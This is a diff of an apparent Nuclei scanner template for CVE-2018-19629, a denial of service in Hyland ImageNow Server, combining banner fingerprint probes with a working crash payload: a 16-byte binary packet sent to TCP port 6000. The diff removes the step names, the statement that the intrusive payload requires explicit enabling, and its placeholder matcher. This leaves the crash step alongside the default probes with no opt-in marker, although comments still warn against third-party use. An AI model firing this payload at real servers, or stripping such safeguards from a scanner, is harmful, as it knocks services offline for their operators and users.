@@ -7,9 +7,9 @@ info:
   description: |
     Hyland Perceptive Content Server (ImageNow) <= 7.1.4 contains a denial of
     service that can be triggered via a specially crafted TCP packet against the
-    ImageNow Server service. This template provides a non-intrusive fingerprint
-    step and an optional intrusive proof-of-concept payload (requires explicit
-    enabling and should only be run against systems you own/are permitted to test).
+    ImageNow Server service. This template includes non-intrusive fingerprint
+    probes and an optional intrusive proof-of-concept payload (do not run
+    against third-party systems).
   reference:
     - https://nvd.nist.gov/vuln/detail/CVE-2018-19629
     - https://www.oppositionsecurity.com/imagenow-7-1-4-dos/
@@ -18,20 +18,17 @@ info:
     cwe-id: CWE-20
   metadata:
     max-request: 1
-    vulnerability: "denial-of-service"
   tags: cve2018,hyland,imagenow,dos,network,tcp,kev
 
 # Non-intrusive fingerprint: try to get an HTTP response if ImageNow serves
 # web UI on typical ports, or read any TCP banner. This step avoids sending the
 # destructive payload and should be run by default.
 tcp:
-  - name: banner-fingerprint
-    description: Non-intrusive banner / HTTP fingerprint
-    host:
+  - host:
       - "{{Hostname}}"
     port: 6000
     read-size: 2048
-    # no explicit data sent, attempt to read banner
+    # attempt to read any banner from the ImageNow service
     matchers:
       - type: word
         words:
@@ -40,9 +37,7 @@ tcp:
           - "Hyland"
         part: body
 
-  - name: http-fingerprint-port-80
-    description: Probe HTTP on port 80 for product strings (safe)
-    host:
+  - host:
       - "{{Hostname}}"
     port: 80
     inputs:
@@ -55,23 +50,15 @@ tcp:
           - "Perceptive"
         part: body
 
-# Intrusive proof-of-concept (DoS). This will send the crash trigger observed in
-# public research. DO NOT RUN AGAINST THIRD-PARTIES. This block is intentionally
-# labelled and should only be executed by operators who understand the impact.
-  - name: poc-crash-port-6000
-    description: Intrusive PoC payload that may crash vulnerable ImageNow servers
+  - # Intrusive proof-of-concept (DoS). This will send the crash trigger observed in
+    # public research. DO NOT RUN AGAINST THIRD-PARTIES. This block is intentionally
+    # labelled and should only be executed by operators who understand the impact.
     host:
       - "{{Hostname}}"
     port: 6000
     inputs:
-      - # binary payload taken from public PoC: 54 4e 4d 50 04 00 00 00 54 4e 4d 45 00 00 04 00
-        data: "\x54\x4e\x4d\x50\x04\x00\x00\x00\x54\x4e\x4d\x45\x00\x00\x04\x00"
+      - data: "\x54\x4e\x4d\x50\x04\x00\x00\x00\x54\x4e\x4d\x45\x00\x00\x04\x00"
     read-size: 512
-    # mark this step as intrusive in the description and rely on operator enabling
-    matchers:
-      - type: word
-        words:
-          - "" # no positive matcher; crash is observed as service reset/close
 
 # Guidance for triage: include -debug output when reporting
 description: |
